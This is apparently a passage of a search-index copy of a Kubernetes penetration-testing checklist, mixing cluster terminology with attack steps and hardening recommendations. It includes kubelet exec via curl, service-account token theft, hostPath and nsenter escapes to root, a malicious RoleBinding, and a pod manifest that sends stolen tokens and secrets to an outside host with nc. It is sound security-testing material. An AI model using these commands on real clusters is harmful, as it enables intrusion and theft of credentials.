services/processes: kube-apiserver - API Server - Available on port 443 - It communicates with kubelet , available on the worker nodes. The communication is bi-directional. ETCD - Scheduler - In a managed cluster, like GKE, google is responsible to upgrade the Master. But you can also manually upgrade it using gcloud CLI tool. Worker node A cluster typically has at least one or more nodes. When people say nodes they usually refer to these worker nodes. It is sometimes called: cluster node, worker node. A worker node is hardware (or virtualized hardware). You need a dedicated VM to function as your worker node. In GKE the worker nodes are just VM-instances. The worker node usually runs these services/processes: Kubelet - The communication between the kubelet and the kube-apiserver is bi-directional. The communication goes over REST HTTP. cAdvisor - Kube-proxy Pod - The pods are running on the worker node. But it is the kube-apiserver that holds the information about pods, like how many replicas it should have, etc. In managed cluster. Like GKE, you never ssh straight to the worker node. Instead the worker node is administrated through gcloud CLI tool or through the web console. The worker node usually have a few different interfaces. One interface on the kubernetes network, where the pods are. A one interface connected to the gcloud network. Workloads You often hear the concept Workloads mentioned. Kubernetes divides workloads into a few different types.1. Deployments 2. StatefulSets 3. DaemonSets 4. Jobs 5. Cronjobs Namespace Namespaces are a way to divide cluster resources in different groups, or namespaces. This can be useful when you want a user to only be able to access certain resources. Those resources can be put in a specific namespace that only that user has access to. A common usecase would be to create a development and a production namespace. Users interacting with one namespace do not see the content in another namespace. Admission controller You here this term quite a bit. An admission controller intercept objects between the user and the apiserver, kind of. An easy way to understand admission controller is to take the admission controller PodSecurityPolicy as an example. A pods properties is usually defined in a yaml file. And it is then deployed using this command: kubectl apply -f podfile.yaml The specification from the file is sent to the apiserver which then performs its magic and deploys the pod. If you have defined a PodSecurityPolicy the pod you are about to deploy is checked against the PodSecurityPolicy to make sure that the pod adheres to that policy, if it does not the deployment is stopped, and if it adheres to the policy the pod is deployed. There are two types of admission controllers: validating and mutating. Validating just valides the object, and mutating mutates it. There are many other admission controllers: https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/ Useful kubectl commands # The most important: kubectl api-resources The greatest kubectl flag you will ever see: -v=9 . Incredible verbosity: You will understand exactly what kubectl is actually doing. kubectl -v=9 get pods Components # Etcd Etcd is a service, normally running on port 2379. Its job is to store data related to the cluster. Things such as configuration data, state, and metadata. Etcd is distributed, which means that it usually runs on every cluster node. RBAC RBAC stands for Role-Based Access Control. It is the authorization model used in Kubernetes. It replaced Attribute Based Access Control (ABAC) since version 1.6. RBAC allows the cluster administrator perform granular access control. Specifying what each user and servoce account can do. A user can have a specific role. It is possible to specify which Object a Role should have access to, and which actions (called verbs) theys hould be able to perform. If the cluster is a managed cluster, like GKE, it is possible, and common, to integreate the cloud IAM with kubernetes RBAC. RBAC lets us define what subjects can take what actions on what types of objects, in what namespaces. RBAC is configured by configuring User (Service user or human-user), Roles and RoleBinding. So we can create a user, then a role, and the we will bind the user to that role. This can be done with just one configuration file, for example like this: kubectl create -f user.yaml --- apiVersion: v1 kind: ServiceAccount metadata: name: mynamespace-user namespace: mynamespace --- kind: Role apiVersion: rbac.authorization.k8s.io/v1beta1 metadata: name: mynamespace-user-full-access namespace: mynamespace rules: - apiGroups: [\"\", \"extensions\", \"apps\"] resources: [\"*\"] verbs: [\"*\"] - apiGroups: [\"batch\"] resources: - jobs - cronjobs verbs: [\"*\"] --- kind: RoleBinding apiVersion: rbac.authorization.k8s.io/v1beta1 metadata: name: mynamespace-user-view namespace: mynamespace subjects: - kind: ServiceAccount name: mynamespace-user namespace: mynamespace roleRef: apiGroup: rbac.authorization.k8s.io kind: Role name: mynamespace-user-full-access Tools # There are a number of tools that can facilitate the pentest or audit of a kubernetes network. kube-hunter Url: https://github.com/aquasecurity/kube-hunter The tool can audit from the external perspective or internal. It can perform a passive or active scans. In active scans the tool will actually exploit vulnerabilities. If you run this you may alter the cluster you are testing, so be careful. The tool can perform many checks such as: Passive Hunters: Mount Hunter - /var/log Hunt pods that have write access to host's /var/log. in such case, the pod can traverse read files on the host machine AKS Hunting Hunting Azure cluster deployments using specific known configurations Host Discovery Generates ip adresses to scan, based on cluster/scan type K8s Dashboard Discovery Checks for the existence of a Dashboard Kubelet Discovery Checks for the existence of a Kubelet service, and its open ports Kubelet Secure Ports Hunter Hunts specific endpoints on an open secured Kubelet Kubelet Readonly Ports Hunter Hunts specific endpoints on open ports in the readonly Kubelet server API Server Hunter Checks if API server is accessible Port Scanning Scans Kubernetes known ports to determine open endpoints for discovery It takes the local ip, and scans the entire range for open ports such as: 8001, 8080, 10250, 10255, 30000, 443, 6443, 2379 Certificate Email Hunting Checks for email addresses in kubernetes ssl certificates API Service Discovery Checks for the existence of K8s API Services K8s CVE Hunter Checks if Node is running a Kubernetes version vulnerable to known CVEs Etcd Remote Access Checks for remote availability of etcd, its version, and read access to the DB Proxy Discovery Checks for the existence of a an open Proxy service Host Discovery when running as pod Generates ip adresses to scan, based on cluster/scan type Pod Capabilities Hunter Checks for default enabled capabilities in a pod Dashboard Hunting Hunts open Dashboards, gets the type of nodes in the cluster Api Version Hunter Tries to obtain the Api Server's version directly from /version endpoint Kubectl CVE Hunter Checks if the kubectl client is vulnerable to known CVEs Etcd service check for the existence of etcd service Access Secrets Accessing the secrets accessible to the pod Kubectl Client Discovery Checks for the existence of a local kubectl client Proxy Hunting Hunts for a dashboard behind the proxy API Server Hunter Accessing the API server using the service account token obtained from a compromised pod Active Hunters: Kubelet Container Logs Hunter Retrieves logs from a random container Prove /var/log Mount Hunter Tries to read /etc/shadow on the host by running commands inside a pod with host mount to /var/log Kubelet Run Hunter Executes uname inside of a random container K8s Version Hunter Hunts Proxy when exposed, extracts the version Build Date Hunter Hunts when proxy is exposed, extracts the build date of kubernetes Azure SPN Hunter Gets the azure subscription file on the host by executing inside a container API server hunter Accessing the api server might grant an attacker full control over the cluster Arp Spoof Hunter Checks for the possibility of running an ARP spoof attack from within a pod (results are based on the running node) Etcd Remote Access Checks for remote write access to etcd- will attempt to add a new key to the etcd DB Kubelet System Logs Hunter Retrieves commands from host's system audit DNS Spoof Hunter Checks for the possibility for a malicous pod to compromise DNS requests of the cluster (results are based on the running node) External Pentest # In an external pentest the scenario is that you do not have access to the kubernetes cluster at all. There is not that much kubernetes-specific attacks that can be performed. Mainly scan for open ports that might be related to kubernetes. Check open ports # nmap <ip> -p 443/tcp - Kubernetes API server 2379/tcp - Etcd 2380/tcp - Etcd 6666/tcp - Etcd 4194/tcp - cAdvisor - Container Metrics 6443/tcp - Kubernetes API server 8443/tcp - Minikube API server 8080/tcp - Kubernetes API server 10250/tcp - Kubelet - HTTPS API with full node access 10255/tcp - Kubelet - Unauthenticated readonly. Pods/runnings pods/nodes 10256/tcp - Kube-proxy - Kube proxy health check server 9099/tcp - Calico Felix - Health check server for Calico 6782-4/tcp - Weave 44134/tcp - Tiller 44135/tcp - Tiller 30000-32767/TCP - Nodeport [ ] Check if the API-server is exposed externally If you have access to a configured kubectl you can retreive the IP-address of the master node with the following command: kubectl config view and then check for server: https://<ip> . The Kubernetes API server by default prohibits \"Anonymous\" users to interact with it. If a request is made without any bearer-token the user is given the username system:anonymous and the group system:unauthenticated . However, you never know it might be misconfigured and allow anonymous. [ ] Check if kubelet port 10255 is exposed - for information disclosure Kubelet is running on all worker nodes. It is running on port 10255, and no authentication is required. It is only possible to read from the API. It is meant to be exposed unauthenticated from inside the cluster. But not externally. Check to see if the port is accessible on all workers nodes external addresses: curl http://<external worker node ip>:10255/pods Internal Pentest # Useful recon commands # kubectl get nodes -o wide -A Get external IP of master node kubectl config view Get internal IP of master node kubectl get svc -o wide # The clusterIP is the internal IP to your master node Check the environment variables in the Pod: env #KUBERNETES_PORT_443_TCP_PROTO=tcp #KUBERNETES_PORT_443_TCP_ADDR=10.39.240.1 #KUBERNETES_SERVICE_HOST=10.39.240.1 #KUBERNETES_PORT=tcp://10.39.240.1:443 #KUBERNETES_PORT_443_TCP_PORT=443 # This will resolve to a Service IP which in turn will be routed to the API server. host kubernetes.default.svc Get IP:s of worker nodes If you have access to kubectl . kubectl get nodes -o wide If you have kubectl and want to run it with a service-token: kubectl --insecure-skip-tls-verify=true --server=\"https://<internal or external kube-apiserver ip>:443\" --token=\"eyJ[...]\" get pods If you are in a pod with kube-hunter you can run: python kube-hunter --interface --mapping What is basically does is that it performs a port-scan of the entire range of the pods internal IP-address. It looks for ports like 8001, 8080, 10250, 10255, 30000, 443, 6443, 2379 Check what node a pod is running on kubectl get pod <name-of-pod> -o yaml Port scan the cluster Check your ip and subnet in the pod: ip a Scan the cidr for interesting ports, you will find other Pods and other nodes. nmap 10.36.0.1/24 -p 8001,8080,10250,10255,30000,443,6443,2379 Basic tests # [ ] Check for anonymous access to kube-apiserver See \"Useful recon commands\" how to get the external or internal IP of the kube-apiserver. The entire kube-apiserver API documentation is found here: https://docs.openshift.com/container-platform/3.3/rest_api/kubernetes_v1.html By default interesting API endpoints are restricted by default, but you never know until you try. curl -k https://<external or internal ip to kube-apiserver>:443/api/v1/componentstatus curl -k https://<external or internal ip to kube-apiserver>:443/api/v1/namespaces/default/secrets You should get a response with Forbidden if it doesn't work. [ ] Check for anonymous access to ETCD Etcd by default does not allow anonymous access to its database, but you never know. kube-hunter checks for the existence of an etcd service on the subnet. It also checks if the user has read access to it. curl http://<internal or external ip>:2379/version curl http://<internal or external ip>:2379/v2/members curl http://<internal or external ip>>:2379/v2/keys/?recursive=true # Or using the etcdctl tool etcdctl -endpoints=http://<MASTER-IP>:2379 get / -prefix -keys-only In GKE port 2379 is only available to the Master API through the loop-back interface. So the port is not exposed externally or on the internal network. [ ] Check if kubelet port 10250 is accessible unauthenticated. Kubelet is a service that is running on the worker nodes. It is just a REST API running on port 10250 and 10255. The idea of the Kubelet API is to receive instructions from the kube-apiserver service on the master node. Since it is not meant for human users its API is actually not documented. But by reading the source we know a little bit about it. For example, the following endpoints: curl -k https://workernode:10250/pods curl -k https://k8-node:10250/runningpods/ Lists running pods curl -k https://workernode:10250/exec Executes a command in a container, and returns a link to view the output. If you get \"Unauthorized\" well, then anonymous users are not authorized to access the API. If you get a response to the /pods request, it might mean that it allows anonymous authentication. Which means that you might be able to RCE the pods. By using the exec endpoint you can execute commands on other pods. curl -k -XPOST \"https://k8-node:10250/run/kube-system/kube-dns-5b1234c4d5-4321/dnsmasq\" -d \"cmd=ls -la /\" # You can also check the environment variable to see if you can get the kubelet token: curl -k -XPOST \"https://k8-node:10250/run/kube-system/kube-dns-5b1234c4d5-4321/dnsmasq\" -d \"cmd=env\" For reference on how to exploit this see: http://carnal0wnage.attackresearch.com/2019/01/kubernetes-unauth-kublet-api-10250_16.html [ ] Check kubelet port 10255 (read only) for information disclosure Kubelet is running on port 10255, but is read-only. It is nothing to report if it is only available on the inside of the cluster, but it should not be exposed externally. It can still be useful to an attacker inside the cluster, as a way to gather information. curl -k http://10.36.2.1:10255/pods [ ] Check for Service account secret / token If no service account is specified for a Pod, the Pod is automatically assigned the default service account in the namespace. Each pod is provided with a service account by default. The extent of the priviliges that is given to that account is configurable. So it is best to just verify it by testing it. The secret token is created and put in a volume that is automatically mounted to pods with the default service account. You can access the service account token (A JWT) in the Pod at the following path: /var/run/secrets/kubernetes.io/serviceaccount/token You can take the JWT and try to authenticate to the kube-apiserver like this: Note that the port can be 443 or 6443. So try both. curl -k -H \"Authorization: Bearer eyJhbG[...] \" https://<masternode ip>:443/api/v1/namespaces/default/secrets Another way to do it is with kubectl like this: kubectl --insecure-skip-tls-verify=true --server=\"https://<masternode-ip>:443\" --token=\"eyJh[...]\" get secrets --all-namespaces -o json kube-kunter also performs this check when running with the --pod flag, like this python kube-hunter.py --pod Reference to hack: https://hackernoon.com/capturing-all-the-flags-in-bsidessf-ctf-by-pwning-our-infrastructure-3570b99b4dd0 Recommendation You can configure an admission controller to not automatically mount the token. [ ] Check for CVE-2018\u20131002105 The vulnerability allows users permitted to one namespace to interact with the Master API in other namespaces. It is easy to test for, the issue is fixed in the following versions, and above: v1.10.11 v1.11.5 v1.12.3 kubectl version For how to exploit it see: https://blog.appsecco.com/analysing-and-exploiting-kubernetes-apiserver-vulnerability-cve-2018-1002105-3150d97b24bb https://gravitational.com/blog/kubernetes-websocket-upgrade-security-vulnerability/ [ ] Check for usage of Helm There is a kubernetes package manager called Helm. Helm consists of a Client, which is the Helm Client. ANd a server, called Tiller server. The Helm repository is just a simple webserver from which you can search and find packages. Tiller is a server running the cluster. [ ] HostPath - Mount worker node root directory to Pod If you have an account that can deploy pods, you can mount the node workers root directory into the pod. And thereafter access the node workers root directory, and for example change the password of a user, which you can then use to ssh into the node. This attack can be performed in the following way: Create a new pod, like the following, and aplly it: kubectl apply -f testdeployment.yaml apiVersion: apps/v1 kind: Deployment metadata: name: testpod-deployment labels: app: testpod spec: replicas: 1 selector: matchLabels: app: testpod template: metadata: labels: app: testpod spec: containers: - name: testpod image: gcr.io/kuberntest/kubeaudit:latest volumeMounts: - mountPath: /root name: rooten volumes: - name: rooten hostPath: path: / Now you can just use chroot and change the password of a user, and then ssh into the node worker with that user. cd /root chroot /root /bin/bash passwd <someuser> In order to perform this attack against all the node-workers it is posssible to deploy a DaemonSet. A DaemonSet is a workload that ensures that a Pod is run on all worker nodes. If new worker nodes are added to the cluster the DaemonSet will ensure that each has the specified pod running on it. It can be sueful if you want to run a logs collection daemon on all nodes, or a monitoring daemon. Those pods usually mount the nodes log directory to the pod. This can be used to ensure that out malicious pod available on all worker nodes. Recommendation You can create a PodSecurityPolicy that disallows pods from mounting the root directory from the Host. You can also create a network policy that disallows outgoing traffic, thus preventing reverse shells a bit. [ ] Check if running Kubelet on master node If you are running kubelet on a master node, and the user is able to mount a directory from the host into the pod, then you will be able to gain access to the etcd certificates. With these certificates it is possible to comunicate directory to etcd, and thereby retreive secrets/tokens of high priviliged users. Note that in your manifest file you can specify which node you want to deploy your POD on. By doing that you can specify that you want to deploy your pod on the master node (if that node is running kubelet). This means that the scheduler, is not a security boundry, you can simply just bypass the scheduler. The attack is explained here, around minute 16: https://www.youtube.com/watch?v=HmoVSmTIOxM Recommendation Don't run kubelet on the control plane (On the master-node) Don't allow mounting of HostPath Sheduler is not a security component - exact node can be specified in the POD manifest [ ] Check for Docker-in-Docker Some people want to run docker in a Pod. In order to do that they usually mount the worker-node docker-socket into the Pod. This is usually done using hostPath in the pod/deployment manifest file. The docker api is unauthenticated, so anyone with access to the socker can interact with it. To check for it grab all the deployment and pod manifest-files, and search for: hostPath: path: /var/run/docker.sock Note that this attack works evern though privilige-escalation is denied, and the Pod is running as a non-root user. So, if the docker-socket is mounted, a user within the Pod can run a docker-container on the underlying host, the worker node, for example. If you can do that, you can mount a worker node directory, such as /etc, to your docker container, and from there gain access to the underlying filesystem. Recommendation Don't mount the docker-socket to a Pod. Restrict usage of hostPath with an admission controller. [ ] Check for HostPid allow So just like you are able to escalate priviliges by mounting in the host root directory, it is also possible to escalate priviliges if you are allowed to create a Pod with the hostPid . See how to attack this here: https://www.youtube.com/watch?v=HmoVSmTIOxM If the Pod is deployed with these settings: securityContext: priviliged: true hostPID: true It means that you can run the following command in the Pod to get a root shell on the underlying host: sudo nsenter -a -t 1 bash Recommendation Use the adminission controller Pod Security Policy and disallow hostPid. Restrict the use of \"priviliged\" containers [ ] Check which services are exposed When an application is deployed, through a Pod or Deployment, it will not automatically become available to users outside the kubernetes cluster. In order to direct traffic to those services a kubernetes service is needed. We need to check what services are exposed externally, to see if any sensitive servicea accidentally has been expoesed. If those services are vulnerable or not can be considered out of scope (we are not testing the applications hosted on the cluster). But some kubernetes specific services might be exposed, and that might constitute a finding. kubectl get services -A -o wide [ ] Check which versions kubernetes components are running A kubernetes cluster consist of many components, and those components vary from cluster to cluster. Some of these components are vulnerable, for example older Traefik versions are vulnerable to RCE. You can check which versions the components have by checking which image they use, this can be Check which image versions of deployments: kubectl describe deployments -A Authorization # There are some quirks regarding the authorization system that might be interesting. For example, a user (maybe even a service account) might have the right to execute commands on pods, but it might not have the right to deploy new pods. If that is the case then it is possible to simply execute a command on other pods and extract the auto-mounted credentials, and then use those credentials to, for example, deploy a new pod. In this way it is possible to escalate in priviliges within a cluster. The most basic components of RBAC (Roles Based Access Control) are the following: ClusterRoles A ClusterRole applies to the whole cluster. Roles A normal Role only applies to a specific namespace. ClusterRoleBindings RoleBindings RBAC grant access to resources with specifc verbs, like get , describe . A resource is basically information that can be access. Secrets, pod information etc. The verbs specify how the resource can be access, get,list,watch etc. RoleBindings and ClusterRoleBinding is of course the way we bind a specific role to a specific user. One tool that I have found that can be of interest is this: https://raw.githubusercontent.com/cyberark/kubernetes-rbac-audit/master/ExtensiveRoleCheck.py https://github.com/cyberark/kubernetes-rbac-audit kubectl get roles --all-namespaces -o json > Roles.json kubectl get clusterroles -o json > clusterroles.json kubectl get rolebindings --all-namespaces -o json > rolebindings.json kubectl get clusterrolebindings -o json > clusterrolebindings.json python ExtensiveRoleCheck.py --clusterRole clusterroles.json --role Roles.json --rolebindings rolebindings.json --cluseterolebindings clusterrolebindings.json To list service accounts: kubectl get serviceaccounts -A [ ] Check for interesting user and service account rights One kind of complicated way to test what a specific user can do is to run the following # Check if your current user can run `exec` on pods. kubectl auth can-i exec pods kubectl auth can-i get pods Take low priviliged account that you have been given or compromised, and use that account when you run: kubectl auth can-i --list kubectl auth can-i --list -n SomeNameSpace So what to look for? Look for the verb list together with secrets . That might mean that you can list other users secrets, and steal their JWT token. Resource Verb Comment secrets list or * secrets get * get Can be used to get secrets. asdasdlasdhaklw Can be used to get secrets. [ ] Check for CVE: CVE-2018-18264 Privilige Escalation kubectl proxy 8001 In your browser go to http://localhost:8001 If you can access it, klick on \"skip\" for the authentication. The go to URL: /api/v1/namespaces/kube-system/secrets/kubernetes-dashboard-certs and see if you can get some secrets. The simple way to check this is to see if the kubernetes version is below: 1.10.1 kubectl version https://sysdig.com/blog/privilege-escalation-kubernetes-dashboard/ [ ] Create Pod in kube-system namespace and automount service account So if you have a kubernetes user that can deploy pods in any namespace you can mount in a high priviliged service account into the the pod, and then extrct those credentials. This can be done in the following way. Deploy the following pod: apiVersion: v1 kind: Pod metadata: name: alpinetest namespace: kube-system spec: containers: - name: alpine image: alpine command: [\"/bin/sh\"] args: [\"-c\", 'apk update && apk add curl --no-cache; sleep 100000'] serviceAccountName: bootstrap-signer automountServiceAccountToken: true hostNetwork: true This technique can be used if your user does not have the permission to list secrets, but is allowed to deploy pods in any namespace. Also, you do not have to have the exec permission to use the attack. You can deploy the pod to automatically send the credentials, like this: apiVersion: v1 kind: Pod metadata: name: alpine namespace: kube-system spec: containers: - name: alpine image: alpine command: [\"/bin/sh\"] args: [\"-c\", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H \"Authorization: Bearer $TOKEN\" -H \"Content-Type: application/json\" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000'] serviceAccountName: bootstrap-signer automountServiceAccountToken: true hostNetwork: true [ ] Deploy pods using Create/update deployment, Daemonsets, statefulsets,Replicationcontrollers, Replicasets, Jobs, Cronjobs There are many ways to deploy pods. Even if your user is not allowed to create a pod it might be possible to create pods using other types of workloads. All these ways can be used to deploy pods and possibily escalate priviliges using the technique explained in the issue above. Workloads that can be used to create pods are the following: Create/update deployments Daemonsets Statefulsets Replicationscontrollers Replicasets Jobs Cronjobs Readthe documentation for each for in order to see how to do it. As in the attack above you will need to be able to deploy in the namespace kube-system . https://www.cyberark.com/threat-research-blog/kubernetes-pentest-methodology-part-1/ [ ] Privilige to use Pods/Exec This is pretty simple. But if your user has the permission to perform pods/exec with any namespace you can simply enter into any pod, and extract the default service accounts. kubectl exec -it <POD NAME> -n <POD\u2019S NAMESPACE> -- sh [ ] Privilege to Get/patch rolebindings The idea here is if your user has the permission to edit rolebindings that use can simply bind a user to the ClusteAdmin role and thereby escalate priviliges to the highest. Check your priviliges with your low priviliges user with the following command: kubectl auth can-i --list If you have the permission to create Rolebindings you can create a malicious rolebinding like this: You might have to change the namespace and the service account to your service account and namespace. { \"apiVersion\": \"rbac.authorization.k8s.io/v1\", \"kind\": \"RoleBinding\", \"metadata\": { \"name\": \"malicious-rolebinding\", \"namespace\": \"default\" }, \"roleRef\": { \"apiGroup\": \"*\", \"kind\": \"ClusterRole\", \"name\": \"admin\" }, \"subjects\": [ { \"kind\": \"ServiceAccount\", \"name\": \"default\", \"namespace\": \"default\" } ] } If it works you can use the token of the service account to do anything to want in the cluster. [ ] Check for impersonation privileges There exists a functionality to impersonate service accounts. This can be used if you want to check that a a serviceaccount has apropriate priviliges, but it can also be used for malicious intents. curl -k -v -XGET -H \u201cAuthorization: Bearer <JWT TOKEN (of the impersonator)>\u201d -H \u201cImpersonate-Group: system:masters\u201d -H \u201cImpersonate-User: null\u201d -H \u201cAccept: application/json\u201d https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/ [ ] Check if RBAC is used Role-Based Access Control has been the stable since version 1.8 RBAC is enabled by the apiserver by starting the apiserver with this flag --authorization-mode=RBAC If you don't ahve access to the apiserver flags you can check it interactivly by running: kubectl api-versions If you see the following output RBAC is enabled: rbac.authorization.k8s.io/v1 rbac.authorization.k8s.io/v1beta1 If Kubernetes is run as a managed cluster with Azure you can check if with the following: az aks list Check for: RBAC true However, it is still possible to disable. Do check that it is enabled. Security Audit # The security audit is a profile used when the tester has a kubernetes user with read privileges and is able to talk to the apiserver. [ ] Check if PodSecurityPolicy is supported It might be that kubernets is started without enabling PSP. kubectl get psp If PSPS is not supported, or enabled you will get the following error: the server doesn't have a resource type \"podSecurityPolicies\". If it is supported you get either the policies or an error such as: No resources found Recommendation Enable PSP. This is done differently according to the vendor. In Minikube it can be done the following way: minikube start --extra-config=apiserver.GenericServerRunOptions.AdmissionControl=NamespaceLifecycle,LimitRanger,ServiceAccount,PersistentVolumeLabel,DefaultStorageClass,ResourceQuota,DefaultTolerationSeconds,PodSecurityPolicy [ ] Check if PodSecurityPolicy is used Remember to add the -A flag, so that you can view the podsecurity policies in all namespaces. kubectl get psp -A kubectl describe psp Inspect the PSPs. Now you need to figure out which PSPs are actually used. PSPs are applied to Pods using annotations. If you are clusteradmin, and can check all pods in all namespaces, you can run the following command: kubectl describe pods -A Now check the annotations part to see which PSP is applied to each Pod. The annotation part usually look something like this: Annotations: kubernetes.io/psp: <name of PSP> [ ] Static analysis of yaml files - Searching for secrets Secrets should not be stored in the yaml configuration for workloads such as pods, deployments, jobs etc. Maybe a secret is stored in an environment variable in the a yaml, and that yaml is accessible to everyone. kubectl describe pods -A kubectl describe deployments -A There are a lot of other bad configurations that can be introduced. One way to check these is with the tool kubesec. I have not used this tool, and not audited it. So run it on your own responsibility. https://kubesec.io/ I think you can just output the yaml file and then run it in kubesec. kubectl describe deployments -A > describe-deployments.txt cat -n describe-deployments.txt | sed -n '/Environment/,/Mount/p' kubectl get pod kubeaudit-6f5964556b-5vnk5 -o yaml [ ] Check that pods are running as non-root users By having the services on the containers running as a non-root user it makes it more difficult for an attacker to escape the the container to the host os. The container is sandboxed from other containers running on the host with the help of linux namespaces. It is more probable that a container breakout is possible if the pod is running as root. Another reason to not run a service as root is that if kubernetes has been misconfigured to accidentally expose volumes to the container, the volume will still not be able to mount because of lacking root priviliges. This can be verified the following way, albeit not perfectly. This way will only show if the service in the container is running as root or some other user. It might be that it is possible to run sudo su and escalate priviliges. kubectl -n thenamespace exec mypod whoami and kubectl -n thenamespace exec -it mypod /bin/bash Therefore it is better to configure a PodSecurityPolicy to handle the problem. It is possible to create a PodSecurityPolicy that disallows containers to run as root. If such a policy exists the apiserver will disallow the deployment of a container that is running as root. The following lines in a PodSecurityPolicy disallows containers from running as root. # Required to prevent escalations to root. allowPrivilegeEscalation: false runAsUser: # Require the container to run without root privileges. rule: 'MustRunAsNonRoot' One issue that might occur here is that the app cant use ports below 1024. This can be solved by running the app on a higher port, by expose it on a lower. An example of this could be the following: kind: Service apiVersion: v1 metadata: name: my-service spec: selector: app: MyApp ports: - protocol: TCP port: 443 targetPort: 8443 https://kubernetes.io/blog/2018/07/18/11-ways-not-to-get-hacked/ [ ] Check the usage of network policies NetworkPolicy is just a kubernetes-word for firewall. By default all pods in the kubernetes cluster is allowed to talk to all pods. There is not segmentation between pods. This can be restricted with network policies. kubectl get networkpolicies -A This is an example of a network policy: apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: myapp-deny-external-egress spec: podSelector: matchLabels: app: myapp policyTypes: - Egress egress: - ports: - port: 53 protocol: UDP - to: - namespaceSelector: {} Resources # https://dev.to/petermbenjamin/kubernetes-security-best-practices-hlk","title":"Attacking Kubernetes"},{"location":"attacking_kubernetes/attacking_kubernetes/#introduction","text":"","title":"Introduction"},{"location":"attacking_kubernetes/attacking_kubernetes/#managed-vs-unmanaged","text":"A good thing to ask the customer is if they are running a managed or unmanaged cluster. That is, is the cluster managed by gcloud (GKE), AWS (EKS), or Microsoft (AKS), or some other cloud-provider? If it is, it's a bit less likely that some of the configuration mistakes are made. It also means that the administrators of the cluster might have less ability to manage the cluster themselves. How much of the cluster that is managed depends on the cloud provider. They might be responsible for updating kubernetes, and configure the Master node, and only let the customer control the worker nodes. In GKE for example, the Control Plane is managed by Gcloud, and the worker nodes are managed by the customer. The Control Plane (Cluster Master/ Master Node) is essentially a black box to the administrator. Another managed kubernetes provider is Rancher. A drawback of using a managed cluster is that you might not have access to all features that is available in a unmanaged cluster. If you run an unmanaged cluster you will have access to the master node, and you will be repsonsible for updating kubernetes.","title":"Managed vs unmanaged"},{"location":"attacking_kubernetes/attacking_kubernetes/#some-terminology","text":"Kubernetes API This API is accessible on port 6443 or 443 (GCE, and other Cloud providers usually run it on port 443, while the default is on 6443) on the master node. It is the API that kubectl uses, and through it you managed the desired state of your cluster. If you have high priviliges to the API you own the cluster. It is with this API that you defined things such as: what pods to run, how many replicas, what network and disk resources you want to make available. The API is the single source of truth. The API is sometimes referred to as kube-apiserver because that is the name of the server running on the Cluster master. Kubernetes Control Plane The Control Plane is in charge of putting your cluster in the state that you configured through the Kubernetes API. The term Control Plane is kind of an umberella term to combine several processes running on the master and worker nodes. The Kubernetes Master is a set of three processes that are running on your Master Node. Those processes are: kube-apiserver , kube-controller-manager , and kube-scheduler . Each non-master node runs the following processes: kubelet and kube-proxy . The kubelet process communicates with the Kubernetes Master. The kube-proxy is a network proxy which reflects Kubernetes networking services on each node. Master node aka Cluster master The master node usually runs these services/processes: kube-apiserver - API Server - Available on port 443 - It communicates with kubelet , available on the worker nodes. The communication is bi-directional. ETCD - Scheduler - In a managed cluster, like GKE, google is responsible to upgrade the Master. But you can also manually upgrade it using gcloud CLI tool. Worker node A cluster typically has at least one or more nodes. When people say nodes they usually refer to these worker nodes. It is sometimes called: cluster node, worker node. A worker node is hardware (or virtualized hardware). You need a dedicated VM to function as your worker node. In GKE the worker nodes are just VM-instances. The worker node usually runs these services/processes: Kubelet - The communication between the kubelet and the kube-apiserver is bi-directional. The communication goes over REST HTTP. cAdvisor - Kube-proxy Pod - The pods are running on the worker node. But it is the kube-apiserver that holds the information about pods, like how many replicas it should have, etc. In managed cluster. Like GKE, you never ssh straight to the worker node. Instead the worker node is administrated through gcloud CLI tool or through the web console. The worker node usually have a few different interfaces. One interface on the kubernetes network, where the pods are. A one interface connected to the gcloud network. Workloads You often hear the concept Workloads mentioned. Kubernetes divides workloads into a few different types.1. Deployments 2. StatefulSets 3. DaemonSets 4. Jobs 5. Cronjobs Namespace Namespaces are a way to divide cluster resources in different groups, or namespaces. This can be useful when you want a user to only be able to access certain resources. Those resources can be put in a specific namespace that only that user has access to. A common usecase would be to create a development and a production namespace. Users interacting with one namespace do not see the content in another namespace. Admission controller You here this term quite a bit. An admission controller intercept objects between the user and the apiserver, kind of. An easy way to understand admission controller is to take the admission controller PodSecurityPolicy as an example. A pods properties is usually defined in a yaml file. And it is then deployed using this command: kubectl apply -f podfile.yaml The specification from the file is sent to the apiserver which then performs its magic and deploys the pod. If you have defined a PodSecurityPolicy the pod you are about to deploy is checked against the PodSecurityPolicy to make sure that the pod adheres to that policy, if it does not the deployment is stopped, and if it adheres to the policy the pod is deployed. There are two types of admission controllers: validating and mutating. Validating just valides the object, and mutating mutates it. There are many other admission controllers: https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/","title":"Some terminology"},{"location":"attacking_kubernetes/attacking_kubernetes/#useful-kubectl-commands","text":"The most important: kubectl api-resources The greatest kubectl flag you will ever see: -v=9 . Incredible verbosity: You will understand exactly what kubectl is actually doing. kubectl -v=9 get pods","title":"Useful kubectl commands"},{"location":"attacking_kubernetes/attacking_kubernetes/#components","text":"Etcd Etcd is a service, normally running on port 2379. Its job is to store data related to the cluster. Things such as configuration data, state, and metadata. Etcd is distributed, which means that it usually runs on every cluster node. RBAC RBAC stands for Role-Based Access Control. It is the authorization model used in Kubernetes. It replaced Attribute Based Access Control (ABAC) since version 1.6. RBAC allows the cluster administrator perform granular access control. Specifying what each user and servoce account can do. A user can have a specific role. It is possible to specify which Object a Role should have access to, and which actions (called verbs) theys hould be able to perform. If the cluster is a managed cluster, like GKE, it is possible, and common, to integreate the cloud IAM with kubernetes RBAC. RBAC lets us define what subjects can take what actions on what types of objects, in what namespaces. RBAC is configured by configuring User (Service user or human-user), Roles and RoleBinding. So we can create a user, then a role, and the we will bind the user to that role. This can be done with just one configuration file, for example like this: kubectl create -f user.yaml --- apiVersion: v1 kind: ServiceAccount metadata: name: mynamespace-user namespace: mynamespace --- kind: Role apiVersion: rbac.authorization.k8s.io/v1beta1 metadata: name: mynamespace-user-full-access namespace: mynamespace rules: - apiGroups: [\"\", \"extensions\", \"apps\"] resources: [\"*\"] verbs: [\"*\"] - apiGroups: [\"batch\"] resources: - jobs - cronjobs verbs: [\"*\"] --- kind: RoleBinding apiVersion: 